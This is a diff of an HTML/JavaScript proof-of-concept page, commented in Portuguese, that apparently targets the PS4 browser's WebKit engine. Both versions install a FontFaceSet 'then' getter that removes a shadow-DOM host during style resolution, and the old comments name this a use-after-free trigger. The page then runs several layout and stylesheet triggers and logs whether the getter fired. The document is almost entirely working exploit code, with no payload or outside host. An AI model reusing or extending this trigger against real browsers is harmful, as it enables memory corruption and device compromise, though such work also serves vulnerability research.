@@ -1,104 +1,61 @@
-
 <!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"></head>
-<body>
-<pre id="log"></pre>
+<html><head><meta charset="utf-8"><title>PS4 FontFaceSet Shadow Root Reentry</title></head>
+<body><pre id="log" style="white-space:pre-wrap"></pre>
 <script>
-
-
-function log(s) { document.getElementById('log').textContent += s + '\n'; }
-
-// Toca document.fonts antes do load event (necessario para m_isDocumentLoaded)
-document.fonts;
-
-// data: URL grande (1.1MB) — confirmado que fica "pending" no PS4 (commit 5ccd64b)
-// Evita o problema de cache: URL grande nao e pre-aquecida por opportunistically...
-var pendingUrl = 'url("data:font/woff;base64,' + 'A'.repeat(1100000) + '")';
-
-function run() {
-    var host = document.createElement('div');
-    document.body.appendChild(host);
-    var shadowRoot = host.attachShadow({ mode: 'open' });
-
-    // @font-face com URL grande → font fica "loading" → document.fonts.ready re-armado
-    var fontFaceStyle = document.createElement('style');
-    fontFaceStyle.textContent =
-        '@font-face { font-family: reentryFont; src: ' + pendingUrl + '; }' +
-        '.probe { font: 24px reentryFont; }';
-    shadowRoot.appendChild(fontFaceStyle);
-
-    var probe = document.createElement('span');
-    probe.className = 'probe';
-    probe.textContent = 'A';
-    shadowRoot.appendChild(probe);
-
-    // Forca layout para iniciar carregamento da fonte
-    void document.body.offsetHeight;
-    log('status apos layout: ' + document.fonts.status);
-
-    // Rastreia o carregamento
-    document.fonts.load('24px reentryFont', 'A');
-    log('status apos load(): ' + document.fonts.status);
-
-    // Materializa a promise ready para que o thenable check ocorra
-    void document.fonts.ready;
-
-    // Prepend style → marca shadow scope com pending Reset update
-    var prependedStyle = document.createElement('style');
-    prependedStyle.textContent = '.unused { color: blue; }';
-    shadowRoot.prepend(prependedStyle);
-
-    var getterCount = 0;
-    Object.defineProperty(FontFaceSet.prototype, 'then', {
-        configurable: true,
-        get: function() {
-            delete FontFaceSet.prototype.then;
-            getterCount++;
-            log('[GETTER DISPAROU] count=' + getterCount + ' status=' + document.fonts.status);
-            // HOST.REMOVE(): libera o ListHashSetNode que o iterator aponta
-            // Se m_inDocumentShadowRoots e iterado neste momento → UAF
-            host.remove();
-            return undefined;
-        }
-    });
-
-    // Trigger 1: document.styleSheets.length (original do commit)
-    var ssLen = document.styleSheets.length;
-    log('T1 styleSheets.length: ' + ssLen + ' | getter: ' + getterCount);
-
-    // Trigger 2: document.body.offsetHeight (forca layout completo + style flush)
-    void document.body.offsetHeight;
-    log('T2 offsetHeight | getter: ' + getterCount);
-
-    // Trigger 3: getComputedStyle no probe (forca resolve de estilo do shadow root)
-    try {
-        var cs = window.getComputedStyle(probe);
-        void cs.fontFamily;
-        log('T3 getComputedStyle | getter: ' + getterCount);
-    } catch(e) {}
-
-    // Trigger 4: shadowRoot.styleSheets (accesso direto)
-    try {
-        void shadowRoot.styleSheets.length;
-        log('T4 shadowRoot.styleSheets | getter: ' + getterCount);
-    } catch(e) {}
-
-    log('status final: ' + document.fonts.status);
-    log('getter total: ' + getterCount);
-
-    // Aguarda async (rendering path que confirmamos disparar o getter)
-    setTimeout(function() {
-        log('getter apos 200ms: ' + getterCount);
-        if (getterCount === 0)
-            log('getter nao disparou — fonte pode ja estar loaded (usar data: URL maior)');
-        log('PASS se chegou aqui sem crash');
-    }, 200);
-}
-
-window.addEventListener('load', function() {
-    setTimeout(run, 0);
+(function () {
+'use strict';
+var out = document.getElementById('log');
+var key = 'ps4-shadow-reentry-last';
+function log(s) { out.textContent += s + '\n'; try { localStorage.setItem(key, out.textContent); } catch(e) {} }
+function show(s) { out.textContent += s + '\n'; }
+var previous = null;
+try { previous = localStorage.getItem(key); } catch(e) {}
+if (previous) { show('--- REGISTRO DA EXECUCAO ANTERIOR ---'); show(previous); show('--- NOVA EXECUCAO ---'); }
+log('START ' + new Date().toISOString());
+log('FontFaceSet=' + typeof FontFaceSet + ' / document.fonts=' + typeof document.fonts);
+if (typeof FontFaceSet !== 'function' || !document.fonts || !document.fonts.ready) { log('ABORT: APIs ausentes'); return; }
+var fonts = document.fonts;
+log('proto correto=' + (Object.getPrototypeOf(fonts) === FontFaceSet.prototype));
+var host = document.createElement('div');
+document.body.appendChild(host);
+var shadow = host.attachShadow({mode:'open'});
+var style = document.createElement('style');
+var family = 'PS4Probe' + Date.now();
+var fontURL = 'test-font.ttf?run=' + Date.now();
+style.textContent = '@font-face{font-family:"' + family + '";src:url("' + fontURL + '") format("truetype");font-weight:normal;} .probe{font:24px "' + family + '";}';
+shadow.appendChild(style);
+var span = document.createElement('span'); span.className = 'probe'; span.textContent = 'AAAA'; shadow.appendChild(span);
+void span.offsetWidth;
+log('apos layout status=' + fonts.status);
+var loadPromise;
+try { loadPromise = fonts.load('24px "' + family + '"', 'AAAA'); log('fonts.load iniciado status=' + fonts.status); }
+catch(e) { log('ERRO fonts.load ' + e); return; }
+// Materializa a Promise de ready antes de instalar o getter, como no caso original.
+var ready = fonts.ready;
+var extraStyle = document.createElement('style'); extraStyle.textContent = '.irrelevante{color:blue}'; shadow.insertBefore(extraStyle, shadow.firstChild);
+var count = 0;
+Object.defineProperty(FontFaceSet.prototype, 'then', {
+ configurable:true,
+ get:function() {
+   delete FontFaceSet.prototype.then;
+   count++;
+   log('GETTER ENTROU count=' + count + ' status=' + fonts.status + ' hostConnected=' + host.isConnected);
+   // OPERACAO CRITICA: altera a colecao de shadow roots enquanto o codigo nativo pode estar iterando.
+   host.remove();
+   log('GETTER REMOVEU HOST connected=' + host.isConnected);
+   return undefined;
+ }
 });
-</script>
-</body>
-</html>
+log('GETTER INSTALADO');
+function trigger(name, fn) { log('ANTES '+name+' count='+count); try { fn(); } catch(e) { log('ERRO '+name+' '+e); } log('DEPOIS '+name+' count='+count); }
+trigger('document.styleSheets.length', function(){ void document.styleSheets.length; });
+trigger('span.offsetWidth', function(){ void span.offsetWidth; });
+trigger('getComputedStyle', function(){ void getComputedStyle(span).fontFamily; });
+trigger('shadow.styleSheets.length', function(){ void shadow.styleSheets.length; });
+// Estes observadores nao resolvem FontFaceSet como valor e nao devem acionar o getter por conta propria.
+ready.then(function(){ log('READY RESOLVIDA count='+count+' status='+fonts.status); }, function(e){ log('READY REJEITADA '+e); });
+loadPromise.then(function(){ log('LOAD RESOLVIDO count='+count+' status='+fonts.status); }, function(e){ log('LOAD REJEITADO '+e); });
+setTimeout(function(){ log('T+250ms status='+fonts.status+' getter='+count); },250);
+setTimeout(function(){ log('T+1500ms status='+fonts.status+' getter='+count+' hostConnected='+host.isConnected); },1500);
+})();
+</script></body></html>
